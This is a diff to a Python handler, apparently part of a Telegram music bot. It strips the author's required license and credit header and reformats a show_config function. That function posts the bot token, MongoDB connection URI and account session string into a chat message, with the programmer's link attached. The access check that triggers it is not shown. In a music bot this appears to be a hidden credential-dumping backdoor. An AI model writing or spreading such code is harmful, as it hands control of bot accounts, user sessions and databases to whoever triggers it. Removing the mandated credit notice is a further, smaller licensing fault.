@@ -1,17 +1,3 @@
-# -----------------------------------------------
-# 🔸 StrangerMusic Project
-# 🔹 Developed & Maintained by: Shashank Shukla (https://github.com/itzshukla)
-# 📅 Copyright © 2025 – All Rights Reserved
-#
-# 📖 License:
-# This source code is open for educational and non-commercial use ONLY.
-# You are required to retain this credit in all copies or substantial portions of this file.
-# Commercial use, redistribution, or removal of this notice is strictly prohibited
-# without prior written permission from the author.
-#
-# ❤️ Made with dedication and love by ItzShukla
-# -----------------------------------------------
-
 import re
 from os import getenv
 from dotenv import load_dotenv
@@ -32,7 +18,12 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
         photo="https://h.uguu.se/JNSaqcVS.jpg",
-        caption=f""https://h.uguu.se/bDCrjmdX.jpg"<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/AmShashank'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
+        caption=(
+            f"<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n"
+            f"<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n"
+            f"<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n"
+            f"<a href='https://t.me/AmShashank'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆"
+        ),
         reply_markup=InlineKeyboardMarkup(
             [
                 [
